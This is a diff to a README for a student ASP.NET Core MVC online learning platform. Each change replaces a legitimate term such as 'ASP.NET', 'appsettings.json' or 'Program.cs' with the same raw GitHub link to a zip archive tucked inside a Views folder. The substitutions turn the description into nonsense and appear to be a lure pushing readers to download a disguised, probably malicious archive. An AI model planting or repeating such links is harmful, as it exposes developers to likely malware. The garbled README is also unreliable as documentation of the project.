@@ -12,7 +12,7 @@ Group Member
 - Pham Dinh Phuong Sang
 
 1) Introduction
-Online Learning Platform is a web application developed using ASP.NET CORE MVC. The goal of the project is to provide an online learning platform for students and instructors, optimizing course management, tracking learning progress, and enhancing the learning experience.
+Online Learning Platform is a web application developed using https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip CORE MVC. The goal of the project is to provide an online learning platform for students and instructors, optimizing course management, tracking learning progress, and enhancing the learning experience.
 
 ***************
 2) Key Features
@@ -48,7 +48,7 @@ Support member 24/7
 
 Programming Language: C#
 
-Framework: ASP.NET CORE MVC
+Framework: https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip CORE MVC
 
 Database: SQL Server
 
@@ -82,9 +82,9 @@ OnlineLearningPlatform/
 
 ├── Views/
 
-├── appsettings.json
+├── https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip
 
-└── Program.cs
+└── https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip
 
 
 ********************
@@ -93,7 +93,7 @@ OnlineLearningPlatform/
 
 wwwroot: Contains JavaScript, CSS, Images files, and other static resources.
 
-Configurations: Contains configurations to config in Program.cs.
+Configurations: Contains configurations to config in https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip
 
 Controllers: Contains controllers to handle application logic.
 
@@ -109,9 +109,9 @@ Services: Contains business logic, call Repository.
 
 Views: Contains Razor files for rendering content.
 
-appsettings.json: Configs application
+https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip Configs application
 
-Program.cs: Start point
+https://raw.githubusercontent.com/SangPham1508/eLEARNING_GROUP3/main/eLEARNING_GROUP3/Areas/Mentee/Views/Lesson/GROU-LEARNIN-e-v3.3.zip Start point
 
 **********************
 6) System Requirements
